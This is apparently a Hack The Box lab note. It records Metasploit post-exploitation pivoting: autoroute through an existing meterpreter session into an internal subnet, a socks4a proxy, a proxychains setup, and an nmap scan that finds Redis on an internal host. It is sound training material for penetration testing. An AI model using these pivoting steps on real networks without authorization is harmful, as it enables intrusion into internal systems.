meterpreter > run autoroute -s 172.19.0.0/24
meterpreter > background
msf auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks4a
msf auxiliary(server/socks4a) > show options
msf auxiliary(server/socks4a) > set srvhost <MY_IP>
msf auxiliary(server/socks4a) > run



# to confirm
msf auxiliary(server/socks4a) > netstat -antp | grep 1080

## Add line to proxychains.conf
root@kali:~/Documents/htb/boxes/reddish# tail /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks4  <MY_IP> 1080

----------------------------------------------------------------------------


## used this website as a guide
## https://pentest.blog/explore-hidden-networks-with-double-pivoting/


meterpreter > run autoroute -s 172.19.0.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.19.0.0/255.255.255.0...
[+] Added route to 172.19.0.0/255.255.255.0 via 10.10.10.94
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.19.0.0         255.255.255.0      Session 6

meterpreter > background
[*] Backgrounding session 6...
msf auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks4a
msf auxiliary(server/socks4a) > show options

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy


msf auxiliary(server/socks4a) > set srvhost <MY_IP>
srvhost => <MY_IP>
msf auxiliary(server/socks4a) > run
[*] Auxiliary module running as background job 8.
msf auxiliary(server/socks4a) >
[*] Starting the socks4a proxy server

msf auxiliary(server/socks4a) > netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080

tcp        0      0 <MY_IP>:1080        0.0.0.0:*               LISTEN      3065/ruby



## Add line to proxychains.conf

root@kali:~/Documents/htb/boxes/reddish# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks4  <MY_IP> 1080






root@kali:~/Documents/htb/boxes/reddish# proxychains nmap -sT -sV -Pn -n -p 6379 --script=smb-vuln-ms08-067.nse 172.19.0.3
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-22 19:10 EDT
|S-chain|-<>-<MY_IP>:1080-<><>-172.19.0.3:6379-<><>-OK
|S-chain|-<>-<MY_IP>:1080-<><>-172.19.0.3:6379-<><>-OK
Nmap scan report for 172.19.0.3
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
